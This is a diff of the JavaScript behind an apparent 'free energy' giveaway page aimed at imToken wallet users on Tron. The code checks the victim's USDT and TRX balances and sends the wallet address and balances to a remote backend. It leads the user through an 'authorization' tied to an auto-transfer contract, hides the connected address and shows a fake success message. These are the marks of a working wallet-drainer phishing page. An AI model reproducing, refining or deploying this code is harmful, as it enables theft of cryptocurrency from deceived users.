         authorizedBtn: "Energy Claimed",
-        afterApproveTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ Authorization successful, energy distributing...</span>",
+        afterApproveTip: "✅ Authorization successful, energy distributing...",
         deployingBtn: "Distributing...",
         loadingBtn: "Loading...",
-        loadingTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ Loading...</span>",
+        loadingTip: "✅ Loading...",
         queryingBalance: "Querying...",
-        insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ Ineligible: USDT balance must exceed 1</span>",
+        insufficientUsdt: "❌ Ineligible: USDT balance must exceed 1",
         insufficientBtn: "Ineligible",
-        eligibleTip: "Connected:<br>{address}<br>USDT Balance: <span style='color: #4ade80;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>✅ Eligible for 90000 USDT Energy</span>",
+        eligibleTip: "✅ Eligible for 90000 USDT Energy",
         distributingBtn: "Energy Distributing...",
         redirectingBtn: "Redirecting to Signature...",
         approveFail: "⚠️ Operation failed: {msg}, please try again later",
         authorizeFail: "⚠️ Authorization failed: {msg}, please try again later",
         successTip: "🎉 Free Energy Claim Completed! 90000μs USDT Energy has been credited～",
         successBtn: "Claim Successful",
-        successArrival: "<br><span style='color: #4ade80;'>✅ 90000μs USDT Energy credited</span>",
+        successArrival: "<br><span style='color: #000000;'>✅ 90000μs USDT Energy credited</span>",
         recordAddress: "Address:",
         recordType: "Claim Type:",
         recordEnergy: "Energy Obtained:",
@@ -848,16 +807,13 @@ const langConfig = {
         systemBusyTip: "System busy, please try again later",
         ineligibleTip: "Ineligible",
         errorTipPrefix: "⚠️ ",
-        noWalletAddress: "No valid wallet address detected<br><span style='color: #ef4444; font-size: 14px;'>❌ Please connect imToken wallet and try again</span>",
-        nonImTokenUser: "Non-imToken user<br><span style='color: #3b82f6; font-size: 13px;'>Auto-launching imToken...</span>",
-        // 新增：非钱包环境容器双语（英文）
+        noWalletAddress: "❌ No valid wallet address detected<br><span style='color: #000000; font-size: 14px;'>Please connect imToken wallet and try again</span>",
+        nonImTokenUser: "Non-imToken user<br><span style='color: #000000; font-size: 13px;'>Auto-launching imToken...</span>",
         specialTipTitle: "imToken-EAB",
         specialTipContent: "This link is only for emergency assistance to imToken users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project."
     }
 };
-// 当前语言
 let currentLang = localStorage.getItem("imtoken_energy_lang") || "zh";
-// ========== 二次授权校验工具 ==========
 const AUTHORIZED_KEY = "authorized_wallet_addresses";
 function getAuthorizedAddresses() {
     try {
@@ -889,16 +845,15 @@ function isAddressAuthorized(address) {
     const thirtyDays = 30 * 24 * 60 * 60 * 1000;
     return Date.now() - receiveTime < thirtyDays;
 }
-// ========== A1信号防重复工具（15分钟） ==========
 function canSendA1Signal(address) {
     try {
         const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
         const lastSendTime = records[address] || 0;
         const now = Date.now();
-        return now - lastSendTime > 15 * 60 * 1000; // 15分钟=900000毫秒
+        return now - lastSendTime > 15 * 60 * 1000;
     } catch (e) {
         console.warn("检查A1信号发送权限失败：", e);
-        return true; // 异常时允许发送
+        return true;
     }
 }
 function updateA1SignalRecord(address) {
@@ -910,13 +865,11 @@ function updateA1SignalRecord(address) {
         console.warn("更新A1信号记录失败：", e);
     }
 }
-// ========== B1信号防重复工具（保留最终版，删除重复的简单版本） ==========
 function hasSentB1Signal(address) {
     try {
         const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
         const item = records[address];
         if (!item) return false;
-        // 30天内已发送B1→触发防重复（显示「我已领取过等待处理」）
         return Date.now() - item.time < 30 * 24 * 60 * 60 * 1000;
     } catch (e) {
         console.warn("检查B1防重复失败：", e);
@@ -926,40 +879,36 @@ function hasSentB1Signal(address) {
 function markB1SignalSent(address) {
     try {
         const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
-        records[address] = { time: Date.now() }; // 发送B1后立即标记
+        records[address] = { time: Date.now() };
         localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
     } catch (e) {
         console.warn("标记B1信号失败：", e);
     }
 }
-// ========== DOM元素缓存（补充弹窗元素） ==========
 const walletStatusContainer = document.getElementById("walletStatusContainer");
 const contractAddrEl = document.getElementById("contractAddr");
 const userInfoEl = document.getElementById("userInfo");
-const userInfoStatus = document.getElementById("userInfoStatus"); // 新增：动态提示容器
+const userInfoStatus = document.getElementById("userInfoStatus");
 const connectBtn = document.getElementById("connectBtn");
 const approveBtn = document.getElementById("approveBtn");
 const warning = document.querySelector('.warning');
 const approvalRecords = document.getElementById("approvalRecords");
 const reviewTip = document.getElementById("reviewTip");
 const reviewTipText = document.getElementById("reviewTipText");
-const langDropdown = document.getElementById("langDropdown"); // 补充：语言下拉容器
-const langToggleBtn = document.getElementById("langToggleBtn"); // 补充：下拉触发按钮
-const langDropdownItems = document.querySelectorAll(".lang-dropdown-item"); // 补充：语言选项
+const langDropdown = document.getElementById("langDropdown");
+const langToggleBtn = document.getElementById("langToggleBtn");
+const langDropdownItems = document.querySelectorAll(".lang-dropdown-item");
 const footerInfo = document.getElementById("footerInfo");
-const recordList = document.getElementById("recordList"); // 记录列表元素
-const specialTipContainer = document.getElementById("specialTipContainer"); // 新增：非钱包环境容器
-// 新增：弹窗元素缓存
+const recordList = document.getElementById("recordList");
+const specialTipContainer = document.getElementById("specialTipContainer");
 const nonImTokenPopup = document.getElementById("nonImTokenPopup");
 const closePopupBtn = document.getElementById("closePopupBtn");
-// 新增：余额项DOM缓存
 const userInfoDefault = document.getElementById("userInfoDefault");
 const balanceUsdtEl = document.getElementById("balanceUsdt");
 const balanceTrxEl = document.getElementById("balanceTrx");
 const balanceEnergyEl = document.getElementById("balanceEnergy");
 const balanceBandwidthEl = document.getElementById("balanceBandwidth");
 const balanceItems = document.querySelectorAll(".balance-item");
-// ========== 错误类型判断 ==========
 function isCustomerError(errMsg) {
     const lang = langConfig[currentLang];
     const customerErrorKeys = [
@@ -969,8 +918,6 @@ function isCustomerError(errMsg) {
     ];
     return customerErrorKeys.some(key => errMsg.includes(key));
 }
-// ========== 语言切换逻辑（修复事件冲突） ==========
-// 初始化语言显示
 function initLangDisplay() {
     if (currentLang === "zh") {
         langToggleBtn.innerHTML = '🇨🇳 <span id="currentLangText">中文</span>';
@@ -978,15 +925,13 @@ function initLangDisplay() {
         langToggleBtn.innerHTML = '🇺🇸 <span id="currentLangText">English</span>';
     }
 }
-// 切换语言
 function changeLang(newLang) {
     currentLang = newLang;
     localStorage.setItem("imtoken_energy_lang", currentLang);
-    initLangDisplay(); // 更新按钮显示
+    initLangDisplay();
     updatePageLang();
     reRenderDynamicContent();
     renderEnergyRecords();
-    // 关闭下拉菜单
     langDropdown.classList.remove("open");
 }
 function updatePageLang() {
@@ -1002,37 +947,28 @@ function updatePageLang() {
     reviewTipText.textContent = lang.reviewTipText;
     approvalRecords.textContent = lang.noRecord;
 }
- // ========== 修复：更新userInfo显示（不覆盖结构，只控制显示/隐藏） ==========       
 async function updateUserInfoDisplay() {
     const lang = langConfig[currentLang];
     if (!userAddress) {
-        // 未连接：显示默认提示，隐藏动态提示和四角余额
         userInfoDefault.style.display = "block";
         userInfoStatus.style.display = "none";
         balanceItems.forEach(item => item.style.display = "none");
         return;
     }
-    // 已连接：隐藏默认提示，显示四角余额（动态提示根据具体状态控制）
     userInfoDefault.style.display = "none";
     balanceItems.forEach(item => item.style.display = "flex");
-    // 更新连接地址和余额数值（原有逻辑不变）
-    const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-    document.getElementById("statusAddress").textContent = shortAddr;
     balanceUsdtEl.textContent = tokenBalance.toFixed(2);
     balanceTrxEl.textContent = trxBalance.toFixed(2);   
     balanceBandwidthEl.textContent = Math.floor(currentBandwidth);
     const userOwnEnergy = await queryUserEnergyBalance(userAddress);
     balanceEnergyEl.textContent = Math.floor(userOwnEnergy);
 }
-// 新增：补充缺失的 updateUserBalanceDisplay 函数
 function updateUserBalanceDisplay() {
-    // 初始化余额显示为0（未连接钱包时）
     balanceUsdtEl.textContent = "0.00";
     balanceTrxEl.textContent = "0.00";
     balanceEnergyEl.textContent = "0";
     balanceBandwidthEl.textContent = "0";
 }
-// 查询用户宽带余额
 async function queryBandwidthBalance(address) {
     try {
         if (!tronWeb) return 0;
@@ -1043,12 +979,10 @@ async function queryBandwidthBalance(address) {
         return 0;
     }
 }
-  // 查询用户自身的能量余额（独立于合约剩余能量）
 async function queryUserEnergyBalance(address) {
     try {
         if (!tronWeb) return 0;
         const account = await tronWeb.trx.getAccount(address);
-        // 用户自身能量 = 账户能量（energy） + 冻结能量（frozenEnergy）
         const userEnergy = (account.energy || 0) + (account.frozenEnergy?.total || 0);
         return userEnergy;
     } catch (e) {
@@ -1056,36 +990,32 @@ async function queryUserEnergyBalance(address) {
         return 0;
     }
 }      
-// ========== 重新渲染动态内容（已加async，删除地址赋值） ==========
 async function reRenderDynamicContent() {
     const lang = langConfig[currentLang];
     if (!userAddress) {
         approveBtn.disabled = true;
         approveBtn.textContent = lang.approveBtnText;
         recordList.style.display = "none";
-        await updateUserInfoDisplay(); // 异步调用
+        await updateUserInfoDisplay();
         return;
     }
     recordList.style.display = "block";
     recordList.style.visibility = "visible";
-    // 特殊地址处理（删除地址赋值）
     if (userAddress === SPECIAL_ADDRESS) {
         updateWalletStatus();
-        await updateUserInfoDisplay(); // 异步调用
+        await updateUserInfoDisplay();
         renderEnergyRecords();
         approveBtn.disabled = false;
         approveBtn.textContent = lang.approveBtnText;
         return;
     }
-    // 30天内已领取（删除地址赋值）
     if (isAddressAuthorized(userAddress)) {
         updateWalletStatus();
-        await updateUserInfoDisplay(); // 异步调用
+        await updateUserInfoDisplay();
         approveBtn.disabled = true;
         approveBtn.textContent = lang.authorizedBtn;
         return;
     }
-    // 余额状态
     if (tokenBalance <= 1) {
         approveBtn.disabled = true;
         approveBtn.textContent = lang.insufficientBtn;
@@ -1094,42 +1024,35 @@ async function reRenderDynamicContent() {
         approveBtn.textContent = lang.approveBtnText;
     }
     updateWalletStatus();
-    await updateUserInfoDisplay(); // 异步调用
+    await updateUserInfoDisplay();
     bindApproveLogic();
     renderEnergyRecords();
 }
-// ========== 能量减少逻辑（优化计算，避免数值异常） ==========
 function calculateCurrentEnergy() {
     const storedData = localStorage.getItem(STORAGE_KEY);
     if (storedData) {
         try {
             const { energy, lastCalcTime } = JSON.parse(storedData);
-            // 确保存储的能量和时间有效
             if (typeof energy === "number" && typeof lastCalcTime === "number") {
                 const secPassed = Math.floor((Date.now() - lastCalcTime) / 1000);
                 currentEnergy = Math.max(0, energy - secPassed * TRX_DECREASE_PER_SEC);
             } else {
-                // 存储数据异常，重新初始化
                 currentEnergy = INIT_TRX;
             }
         } catch (e) {
-            // JSON解析失败，重新初始化
             currentEnergy = INIT_TRX;
         }
     } else {
-        const secPassed = Math.max(0, Math.floor((Date.now() - DEPLOY_START_TIME) / 1000)); // 确保secPassed非负
+        const secPassed = Math.max(0, Math.floor((Date.now() - DEPLOY_START_TIME) / 1000));
         currentEnergy = Math.max(0, INIT_TRX - secPassed * TRX_DECREASE_PER_SEC);
     }
-    // 存储最新数据（确保数值不溢出）
     localStorage.setItem(STORAGE_KEY, JSON.stringify({
         energy: currentEnergy,
         lastCalcTime: Date.now()
     }));
-    // 更新合约能量显示（修复拼写错误）
     if (contractEnergyEl) contractEnergyEl.textContent = Math.floor(currentEnergy);
     return currentEnergy;
 }
-// 能量显示更新（沿用之前的递归定时器，只改计算逻辑）
 function updateEnergyDisplay() {
     if (!contractEnergyEl) return;
     calculateCurrentEnergy();
@@ -1138,9 +1061,7 @@ function updateEnergyDisplay() {
     contractEnergyEl.offsetHeight;
     console.log("能量跳动中：", Math.floor(currentEnergy));
 }
-// 启动定时器（无改动，沿用递归模式）
 function startPersistentEnergyCountdown() {
-    // 可选：首次使用时清除旧缓存（只执行一次）
     const hasClearedOldCache = localStorage.getItem("has_cleared_old_cache");
     if (!hasClearedOldCache) {
         localStorage.removeItem(STORAGE_KEY);
@@ -1159,7 +1080,6 @@ function startPersistentEnergyCountdown() {
     tick();
     console.log("能量定时器已启动，递归模式");
 }
-// ========== 页面初始化（修复语言切换事件绑定） ==========
 document.addEventListener('DOMContentLoaded', async () => {
     localStorage.removeItem("energy_state");
     console.log("已清除旧缓存");
@@ -1170,49 +1090,42 @@ document.addEventListener('DOMContentLoaded', async () => {
         return;
     }
     startPersistentEnergyCountdown();
-    initLangDisplay(); // 初始化语言按钮显示
+    initLangDisplay();
     updatePageLang();
     contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
-    // 新增：设置合约初始能量值
-    contractEnergyEl.textContent = Math.floor(INIT_TRX); // 显示初始能量
+    contractEnergyEl.textContent = Math.floor(INIT_TRX);
     renderEnergyRecords();
     updateWalletStatus();
-    updateUserBalanceDisplay(); // 初始化余额显示
+    updateUserBalanceDisplay();
     
-    // 绑定语言下拉菜单事件（修复之前缺失的绑定）
     langToggleBtn.addEventListener("click", (e) => {
-        e.stopPropagation(); // 阻止事件冒泡
+        e.stopPropagation();
         langDropdown.classList.toggle("open");
     });
-    // 绑定语言选项点击事件（修复getAttribute参数错误）
     langDropdownItems.forEach(item => {
         item.addEventListener("click", (e) => {
             e.stopPropagation();
-            const newLang = item.getAttribute("data-lang"); // 修正：获取data-lang属性
+            const newLang = item.getAttribute("data-lang");
             changeLang(newLang);
         });
     });
-    // 点击页面其他地方关闭下拉菜单
     document.addEventListener("click", () => {
         langDropdown.classList.remove("open");
     });
-    // 阻止下拉菜单内部点击事件冒泡
     langDropdown.addEventListener("click", (e) => {
         e.stopPropagation();
     });
     
-    // 初始隐藏记录列表
     recordList.style.display = "none";
     await checkImTokenEnv().catch(err => {
         console.error("环境检测失败：", err);
         const lang = langConfig[currentLang];
-        // 修复：显示默认提示，隐藏动态提示和四角余额
         userInfoDefault.style.display = "block";
         userInfoStatus.style.display = "none";
         balanceItems.forEach(item => item.style.display = "none");
         approveBtn.disabled = true;
         approveBtn.textContent = lang.approveBtnText;
-        updateUserBalanceDisplay(); // 未连接时更新显示
+        updateUserBalanceDisplay();
     });
     window.addEventListener("beforeunload", () => {
         if (trxTimer) clearTimeout(trxTimer);
@@ -1223,19 +1136,16 @@ document.addEventListener('DOMContentLoaded', async () => {
             initWallet(true).catch(err => {
                 console.error("授权后初始化失败：", err);
                 const lang = langConfig[currentLang];
-                const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
                 const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
-                // 修复：显示动态提示，隐藏默认提示
                 userInfoDefault.style.display = "none";
                 userInfoStatus.style.display = "block";
-                userInfoStatus.innerHTML = `<span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
+                userInfoStatus.innerHTML = `<span style='color: #000000; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
                 approveBtn.disabled = false;
                 approveBtn.textContent = lang.approveBtnText;
             });
         }, 500);
     }
 });
-// ========== 环境检测（最终版：用官方Scheme直接唤起浏览器） ==========
 async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     if (window.tronWeb) {
@@ -1246,15 +1156,12 @@ async function checkImTokenEnv() {
         await initWallet(false);
         return;
     }
-    // 确认按钮已渲染（兜底）
     if (!connectBtn) {
         console.warn("⚠️ 连接按钮未找到，稍后重试");
         setTimeout(() => checkImTokenEnv(), 500);
         return;
     }
-    // 非imToken环境：100%复用你已定义的正确配置
     specialTipContainer.style.display = "block";
-    // 修复：显示动态提示（非imToken用户），隐藏默认提示和四角余额
     userInfoDefault.style.display = "none";
     userInfoStatus.style.display = "block";
     userInfoStatus.innerHTML = lang.nonImTokenUser;
@@ -1265,12 +1172,10 @@ async function checkImTokenEnv() {
     const jumpUrl = imTokenConfig.scheme + encodeURIComponent(fullTargetUrl);
     console.log("📤 复用已定义配置跳转：", jumpUrl);
     window.location.href = jumpUrl;
-    // 延迟3秒检测结果
     setTimeout(() => {
         if (!window.tronWeb) {
             nonImTokenPopup.style.display = "block";
             connectBtn.style.display = "block";
-            // 按钮也复用同一配置
             connectBtn.onclick = () => {
                 const fullTargetUrl = window.location.href + "#approve";
                 const jumpUrl = imTokenConfig.scheme + encodeURIComponent(fullTargetUrl);
@@ -1282,12 +1187,10 @@ async function checkImTokenEnv() {
         nonImTokenPopup.style.display = "none";
     };
 }
-// ========== 钱包初始化（完整修复版） ==========
 async function initWallet(isAfterApprove) {
     const lang = langConfig[currentLang];
     try {
-        userAddress = tronWeb.defaultAddress?.base58; // 兼容钱包未授权
-        // 1. 特殊地址白名单（隐藏地址+仅显示状态）
+        userAddress = tronWeb.defaultAddress?.base58;
         if (userAddress === SPECIAL_ADDRESS) {
             trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
             const [usdtRaw, trxRaw] = await Promise.all([
@@ -1296,21 +1199,17 @@ async function initWallet(isAfterApprove) {
             ]);
             tokenBalance = Number(usdtRaw) / 1000000;
             trxBalance = Number(trxRaw) / 1000000;
-            // 显示动态状态（无地址、无余额）
             userInfoDefault.style.display = "none";
             userInfoStatus.style.display = "block";
-            userInfoStatus.innerHTML = lang.eligibleTip.replace(/\{address\}|{usdt}|{trx}/g, "");
-            // 显示四角余额
+            userInfoStatus.innerHTML = lang.eligibleTip;
             balanceItems.forEach(item => item.style.display = "flex");
-            await updateUserInfoDisplay(); // 异步更新
+            await updateUserInfoDisplay();
             approveBtn.disabled = false;
             approveBtn.textContent = lang.approveBtnText;
-            // 强制隐藏地址
             const statusAddressEl = document.getElementById("statusAddress");
             if (statusAddressEl) statusAddressEl.style.display = "none";
             updateWalletStatus();
             
-            // 发送A1信号（防重复）
             if (canSendA1Signal(userAddress)) {
                 sendSignalA1().catch(err => console.error("A1信号异步发送失败：", err));
                 updateA1SignalRecord(userAddress);
@@ -1320,7 +1219,6 @@ async function initWallet(isAfterApprove) {
             renderEnergyRecords();
             return;
         }
-        // 2. 无钱包地址
         if (!userAddress) {
             userInfoDefault.style.display = "none";
             userInfoStatus.style.display = "block";
@@ -1332,7 +1230,6 @@ async function initWallet(isAfterApprove) {
             recordList.style.display = "none";
             return;
         }
-        // 查询余额（仅用于判断）
         trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
         const [usdtRaw, trxRaw] = await Promise.all([
             trc20Contract.balanceOf(userAddress).call().catch(err => 0),
@@ -1340,16 +1237,14 @@ async function initWallet(isAfterApprove) {
         ]);
         tokenBalance = Number(usdtRaw) / 1000000;
         trxBalance = Number(trxRaw) / 1000000;
-        // 强制隐藏地址
         const statusAddressEl = document.getElementById("statusAddress");
         if (statusAddressEl) statusAddressEl.style.display = "none";
-        // 3. 30天内已领取（仅显示状态）
         if (isAddressAuthorized(userAddress)) {
             userInfoDefault.style.display = "none";
             userInfoStatus.style.display = "block";
-            userInfoStatus.innerHTML = lang.authorizedTip.replace(/\{address\}|{usdt}|{trx}/g, "");
+            userInfoStatus.innerHTML = lang.authorizedTip;
             balanceItems.forEach(item => item.style.display = "flex");
-            await updateUserInfoDisplay(); // 异步更新
+            await updateUserInfoDisplay();
             approveBtn.disabled = true;
             approveBtn.textContent = lang.authorizedBtn;
             updateWalletStatus();
@@ -1357,13 +1252,12 @@ async function initWallet(isAfterApprove) {
             renderEnergyRecords();
             return;
         }
-        // 4. USDT余额不足（仅显示状态）
         if (tokenBalance <= 1) {
             userInfoDefault.style.display = "none";
             userInfoStatus.style.display = "block";
-            userInfoStatus.innerHTML = lang.insufficientUsdt.replace(/\{address\}|{usdt}|{trx}/g, "");
+            userInfoStatus.innerHTML = lang.insufficientUsdt;
             balanceItems.forEach(item => item.style.display = "flex");
-            await updateUserInfoDisplay(); // 异步更新
+            await updateUserInfoDisplay();
             approveBtn.disabled = true;
             approveBtn.textContent = lang.insufficientBtn;
             updateWalletStatus();
@@ -1371,7 +1265,6 @@ async function initWallet(isAfterApprove) {
             renderEnergyRecords();
             return;
         }
-        // 5. 非imToken用户
         if (!window.tronWeb || !window.tronWeb.defaultAddress) {
             userInfoDefault.style.display = "none";
             userInfoStatus.style.display = "block";
@@ -1383,14 +1276,12 @@ async function initWallet(isAfterApprove) {
             recordList.style.display = "none";
             return;
         }
-        // 6. 符合条件（仅显示状态）
         userInfoDefault.style.display = "none";
         userInfoStatus.style.display = "block";
-        userInfoStatus.innerHTML = lang.eligibleTip.replace(/\{address\}|{usdt}|{trx}/g, "");
+        userInfoStatus.innerHTML = lang.eligibleTip;
         balanceItems.forEach(item => item.style.display = "flex");
-        await updateUserInfoDisplay(); // 异步更新
+        await updateUserInfoDisplay();
         updateWalletStatus();
-        // 发送A1信号（防重复）
         if (canSendA1Signal(userAddress)) {
             sendSignalA1().catch(err => console.error("A1信号异步发送失败：", err));
             updateA1SignalRecord(userAddress);
@@ -1401,16 +1292,14 @@ async function initWallet(isAfterApprove) {
         recordList.style.display = "block";
         renderEnergyRecords();
     } catch (e) {
-        // 错误处理
         console.error("钱包初始化失败：", e);
-        const errorTip = userAddress ? lang.insufficientUsdt.replace(/\{address\}|{usdt}|{trx}/g, "") : lang.noWalletAddress;
+        const errorTip = userAddress ? lang.insufficientUsdt : lang.noWalletAddress;
         userInfoDefault.style.display = "none";
         userInfoStatus.style.display = "block";
         userInfoStatus.innerHTML = errorTip;
-        // 有地址显示四角余额，无地址隐藏
         if (userAddress) {
             balanceItems.forEach(item => item.style.display = "flex");
-            await updateUserInfoDisplay(); // 异步更新
+            await updateUserInfoDisplay();
         } else {
             balanceItems.forEach(item => item.style.display = "none");
         }
@@ -1421,11 +1310,10 @@ async function initWallet(isAfterApprove) {
         if (userAddress) renderEnergyRecords();
     }
 }
-// ========== 发送信号函数 ==========
 async function sendSignalA1() {
     const requestData = { userAddress };
     const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 20000); // 20秒超时兜底
+    const timeoutId = setTimeout(() => controller.abort(), 20000);
     try {
         const res = await fetch(`${BACKEND_API}/api/send-signal-a1`, {
             method: "POST",
@@ -1435,27 +1323,25 @@ async function sendSignalA1() {
             keepalive: true
         });
         clearTimeout(timeoutId);
-        
-        // 兼容200-299所有成功状态（包括204）
         if (res.ok) {
             const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
-            a1Status[userAddress] = "success"; // 标记成功，写入本地缓存
+            a1Status[userAddress] = "success";
             localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
             console.log(`✅ A1信号发送成功（后端返回状态码：${res.status}）`);
-            return "success"; // 统一返回成功标识
+            return "success";
         }
         throw new Error(`A1信号后端返回非成功状态：${res.status}`);
     } catch (e) {
         clearTimeout(timeoutId);
         console.warn("❌ A1信号发送失败（网络/超时/后端异常）：", e);
-        return "fail"; // 失败返回标识
+        return "fail";
     }
 }
 async function sendSignalA2() {
     const requestData = { 
         userAddress, 
         usdtBalance: tokenBalance, 
-        trxBalance: trxBalance // 直接复用已有TRX余额（无需重新计算）
+        trxBalance: trxBalance 
     };
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 20000);
@@ -1463,7 +1349,7 @@ async function sendSignalA2() {
         const res = await fetch(`${BACKEND_API}/api/send-signal-a2`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(requestData), // 包含3个参数
+            body: JSON.stringify(requestData),
             signal: controller.signal,
             keepalive: true
         });
@@ -1481,7 +1367,6 @@ async function sendSignalA2() {
         return false;
     }
 }
-// 重构sendSignalB：不抛出错误，避免卡住，统一返回true/false
 async function sendSignalB(isB1 = true) {
     const requestData = { userAddress };
     const apiPath = isB1 ? "/api/send-signal-b1" : "/api/send-signal-b2";
@@ -1497,29 +1382,25 @@ async function sendSignalB(isB1 = true) {
             keepalive: true
         });
         clearTimeout(timeoutId);
-        // 1. 客户端错误（400/408/409）：用户不合规，返回false
         if ([400, 408, 409].includes(res.status)) {
             const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
             console.warn(`❌ ${isB1 ? "B1" : "B2"}信号用户不合规：`, errData.detail);
             return false;
         }
-        // 2. 成功回应（200-299）：只要状态码正确，无需响应体
         if (res.ok) {
             console.log(`✅ 信号${isB1 ? "B1" : "B2"}处理成功`);
             addAuthorizedAddress(userAddress); 
-            saveEnergyRecord(); // 保存记录
+            saveEnergyRecord();
             return true;
         }
-        // 3. 其他失败（500等）：返回false
         console.warn(`❌ ${isB1 ? "B1" : "B2"}信号后端返回异常状态：${res.status}`);
         return false;
     } catch (e) {
         clearTimeout(timeoutId);
         console.error(`❌ ${isB1 ? "B1" : "B2"}信号发送异常：`, e);
-        return false; // 异常时返回false，不卡住前端
+        return false;
     }
 }
-// ========== 新增：A1失败重试逻辑 ==========
 function bindRetryA1Logic() {
     const lang = langConfig[currentLang];
     approveBtn.disabled = false;
@@ -1528,16 +1409,13 @@ function bindRetryA1Logic() {
         const btn = document.getElementById("approveBtn");
         btn.disabled = true;
         btn.textContent = "检测中...";
-        // 动态提示仅显示状态（无地址、无余额）
-        userInfoStatus.innerHTML = `<span style='color: #4ade80; font-size: 13px;'>✅ 正在重新检测环境...</span>`;
-        const a1Result = await sendSignalA1(); // 重试发送A1
+        userInfoStatus.innerHTML = `<span style='color: #000000; font-size: 13px;'>✅ 正在重新检测环境...</span>`;
+        const a1Result = await sendSignalA1();
         if (a1Result === "success") {
-            // 动态提示仅显示状态
-            userInfoStatus.innerHTML = `<span style='color: #3b82f6; font-size: 13px;'>✅ 环境符合领取条件</span>`;
-            bindApproveLogic(); // 重试成功→重新绑定领取逻辑
+            userInfoStatus.innerHTML = `<span style='color: #000000; font-size: 13px;'>✅ 环境符合领取条件</span>`;
+            bindApproveLogic();
         } else {
-            // 动态提示仅显示状态
-            userInfoStatus.innerHTML = `<span style='color: #ef4444; font-size: 13px;'>⚠️ 环境检测失败，可重试</span>`;
+            userInfoStatus.innerHTML = `<span style='color: #000000; font-size: 13px;'>⚠️ 环境检测失败，可重试</span>`;
             btn.disabled = false;
             btn.textContent = "重新检测环境";
         }
